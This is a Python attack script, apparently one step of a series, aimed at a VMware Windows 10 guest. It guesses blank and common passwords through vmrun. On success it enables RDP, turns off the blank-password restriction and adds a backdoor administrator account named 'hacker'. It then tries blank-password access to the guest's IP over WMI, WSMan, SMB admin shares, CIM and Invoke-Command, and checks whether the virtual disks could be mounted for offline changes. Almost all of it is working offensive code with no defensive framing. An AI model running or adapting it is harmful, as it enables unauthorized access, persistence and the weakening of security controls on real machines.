#!/usr/bin/env python3
"""Step 14: Use PowerShell Direct + vmrun with correct blank password handling
PowerShell Direct works through VM bus, bypasses network restrictions
"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
TARGET_VMX = r'D:\software\vmware\project\windows\Windows 10.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_ps(cmd, timeout=30):
    """Run PowerShell command on host"""
    result = subprocess.run(['powershell', '-Command', cmd],
                          capture_output=True, text=True, timeout=timeout)
    return result.stdout + result.stderr

# 1. Try vmrun with proper blank password handling
print("=" * 60)
print("[1] vmrun with blank password (different formats)")
print("=" * 60)

# Try different ways to pass blank password
configs = [
    ('lkjm', ''),           # blank
    ('lkjm', ' '),          # space
    ('lkjm', '""'),         # quoted blank
    ('Administrator', ''),  # admin blank
    ('lkjm', '123'),        # common
    ('lkjm', 'password'),   # common
]

for user, pwd in configs:
    try:
        args = [VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                'runProgramInGuest', TARGET_VMX,
                '-activeWindow',
                'cmd.exe', '/c', 'whoami > C:\\vmrun_test.txt 2>&1']
        result = subprocess.run(args, capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            # Try to read output
            temp_file = os.path.join(TEMP, 'vmrun_test.txt')
            subprocess.run([VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                           'copyFileFromGuestToHost', TARGET_VMX,
                           'C:\\vmrun_test.txt', temp_file],
                          capture_output=True, text=True, timeout=15)
            try:
                with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                    output = f.read()
                print(f"  [+] {user}/{repr(pwd)}: SUCCESS! Output: {output.strip()}")
            except:
                print(f"  [+] {user}/{repr(pwd)}: Command ran but no output file")
            
            # If successful, run exploitation
            if result.returncode == 0 and user == 'lkjm':
                print(f"\n[!] CREDENTIAL FOUND: {user}/{repr(pwd)}")
                print("[!] Executing exploitation commands...")
                
                # Enable RDP
                r = subprocess.run([VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                    'runProgramInGuest', TARGET_VMX, '-activeWindow',
                    'cmd.exe', '/c',
                    'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f > C:\\vmrun_rdp.txt 2>&1'],
                    capture_output=True, text=True, timeout=15)
                print(f"  RDP: {r.returncode}")
                
                # Disable blank password restriction
                r = subprocess.run([VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                    'runProgramInGuest', TARGET_VMX, '-activeWindow',
                    'cmd.exe', '/c',
                    'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f > C:\\vmrun_policy.txt 2>&1'],
                    capture_output=True, text=True, timeout=15)
                print(f"  Policy: {r.returncode}")
                
                # Add backdoor user
                r = subprocess.run([VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                    'runProgramInGuest', TARGET_VMX, '-activeWindow',
                    'cmd.exe', '/c',
                    'net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add > C:\\vmrun_user.txt 2>&1'],
                    capture_output=True, text=True, timeout=15)
                print(f"  Add user: {r.returncode}")
                
                # Read all outputs
                for name in ['vmrun_rdp', 'vmrun_policy', 'vmrun_user']:
                    temp_file = os.path.join(TEMP, f'{name}.txt')
                    subprocess.run([VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                                   'copyFileFromGuestToHost', TARGET_VMX,
                                   f'C:\\{name}.txt', temp_file],
                                  capture_output=True, text=True, timeout=15)
                    try:
                        with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                            print(f"  {name}: {f.read().strip()}")
                    except:
                        pass
                
                break
        else:
            print(f"  [-] {user}/{repr(pwd)}: Failed ({result.stderr.strip()[:80]})")
    except Exception as e:
        print(f"  [-] {user}/{repr(pwd)}: Error ({e})")

# 2. Try PowerShell Direct (Hyper-V style, may not work with VMware)
print("\n" + "=" * 60)
print("[2] PowerShell Direct / WMI remote")
print("=" * 60)

# Try WMI from host
out = run_ps(
    "Get-WmiObject -ComputerName 192.168.233.129 -Class Win32_OperatingSystem -ErrorAction SilentlyContinue | Select-Object Caption,Version,BuildNumber",
    timeout=15
)
print(f"WMI: {out}")

# Try Enter-PSSession
out = run_ps(
    "Test-WSMan -ComputerName 192.168.233.129 -ErrorAction SilentlyContinue",
    timeout=10
)
print(f"WSMan: {out}")

# 3. Try SMB from host with blank password
print("\n" + "=" * 60)
print("[3] SMB from host with blank password")
print("=" * 60)
out = run_ps(
    "net use \\\\192.168.233.129\\C$ /user:lkjm '' 2>&1",
    timeout=10
)
print(f"SMB C$: {out}")

out = run_ps(
    "net use \\\\192.168.233.129\\IPC$ /user:lkjm '' 2>&1",
    timeout=10
)
print(f"SMB IPC$: {out}")

# 4. Try to use New-CimSession
print("\n" + "=" * 60)
print("[4] CIM Session")
print("=" * 60)
out = run_ps(
    "try { $s = New-CimSession -ComputerName 192.168.233.129 -Credential (New-Object System.Management.Automation.PSCredential('lkjm', (ConvertTo-SecureString '' -AsPlainText -Force))) -ErrorAction Stop; Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem | Select Caption; Remove-CimSession $s } catch { $_.Exception.Message }",
    timeout=15
)
print(f"CIM: {out}")

# 5. Try Invoke-Command with blank password
print("\n" + "=" * 60)
print("[5] Invoke-Command with credentials")
print("=" * 60)
out = run_ps(
    "$cred = New-Object System.Management.Automation.PSCredential('lkjm', (ConvertTo-SecureString '' -AsPlainText -Force)); try { Invoke-Command -ComputerName 192.168.233.129 -Credential $cred -ScriptBlock { whoami } -ErrorAction Stop } catch { $_.Exception.Message }",
    timeout=15
)
print(f"Invoke-Command: {out}")

# 6. Try to mount VMDK and modify offline
print("\n" + "=" * 60)
print("[6] Check if we can mount VMDK")
print("=" * 60)
out = run_ps(
    "Get-ChildItem 'D:\\software\\vmware\\project\\windows\\' -Filter '*.vmdk' | Select-Object Name,Length",
    timeout=10
)
print(f"VMDK files: {out}")

print("\n" + "=" * 60)
print("DIRECT ACCESS PHASE COMPLETE")
print("=" * 60)
